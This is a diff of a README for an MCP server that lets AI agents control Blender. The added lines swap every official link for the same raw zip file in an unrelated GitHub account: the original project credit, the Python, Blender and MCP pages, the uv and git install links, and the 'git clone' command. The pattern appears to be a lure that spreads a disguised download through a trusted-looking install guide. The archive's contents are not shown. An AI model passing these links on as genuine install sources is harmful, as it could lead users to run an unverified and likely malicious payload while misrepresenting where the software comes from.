@@ -1,4 +1,4 @@
-> **Inspired by [blender-mcp](https://github.com/ahujasid/blender-mcp) by Siddharth Ahuja** — the original proof-of-concept that demonstrated connecting AI agents to Blender over MCP. This project builds on that idea with a production-grade architecture: 69 tool groups, 550+ actions, multilingual intent routing, BVH assembly analysis, thread-safe execution, and a 499-test suite.
+> **Inspired by [blender-mcp](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip) by Siddharth Ahuja** — the original proof-of-concept that demonstrated connecting AI agents to Blender over MCP. This project builds on that idea with a production-grade architecture: 69 tool groups, 550+ actions, multilingual intent routing, BVH assembly analysis, thread-safe execution, and a 499-test suite.
 
 ---
 
@@ -8,16 +8,16 @@
 
 Give Claude, GPT, or any MCP-capable AI the ability to create, inspect, and animate 3D scenes in Blender using plain language and structured tool calls.
 
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![Blender 5.0+](https://img.shields.io/badge/Blender-5.0%2B-E87D0D?logo=blender&logoColor=white)](https://www.blender.org/)
-[![MCP](https://img.shields.io/badge/MCP-JSON--RPC%202.0-6C47FF)](https://modelcontextprotocol.io/)
+[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip)
+[![Blender 5.0+](https://img.shields.io/badge/Blender-5.0%2B-E87D0D?logo=blender&logoColor=white)](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip)
+[![MCP](https://img.shields.io/badge/MCP-JSON--RPC%202.0-6C47FF)](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
 ---
 
 ## What is this?
 
-[MCP (Model Context Protocol)](https://modelcontextprotocol.io/) is an open standard that lets AI assistants call structured tools — the same way a programmer calls an API. This project implements an MCP server that bridges your AI assistant to a live Blender session running on your computer.
+[MCP (Model Context Protocol)](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip) is an open standard that lets AI assistants call structured tools — the same way a programmer calls an API. This project implements an MCP server that bridges your AI assistant to a live Blender session running on your computer.
 
 In practice: tell your AI *"create a red metallic sphere above the cube"* or *"check if all drone parts are touching"* and it will call the right Blender tools, get real geometry data back, and show you a screenshot — no Python required from your side.
 
@@ -77,17 +77,17 @@ See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for detailed diagrams.
 | Requirement | Version | Notes |
 |-------------|---------|-------|
 | **Platform** | Windows / macOS / Linux | All three are supported — the MCP protocol and wire format are platform-agnostic |
-| [Blender](https://www.blender.org/download/) | **5.0 or later** | Must be installed and running locally |
-| [Python](https://www.python.org/downloads/) | **3.10 or later** | For the MCP bridge (outside Blender) |
-| [uv](https://docs.astral.sh/uv/getting-started/installation/) | latest | Recommended — fast, isolated environments |
-| [git](https://git-scm.com/) | any | To clone the repository |
+| [Blender](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip) | **5.0 or later** | Must be installed and running locally |
+| [Python](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip) | **3.10 or later** | For the MCP bridge (outside Blender) |
+| [uv](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip) | latest | Recommended — fast, isolated environments |
+| [git](https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip) | any | To clone the repository |
 
 </details>
 
 ### Step 1 — Clone the repository
 
 ```bash
-git clone https://github.com/glonorce/Blender_mcp.git
+git clone https://raw.githubusercontent.com/Immunogenic-prismspectroscope589/Blender_mcp/main/scripts/quality/mcp-Blender-v1.7.zip
 cd Blender_mcp
 ```
 
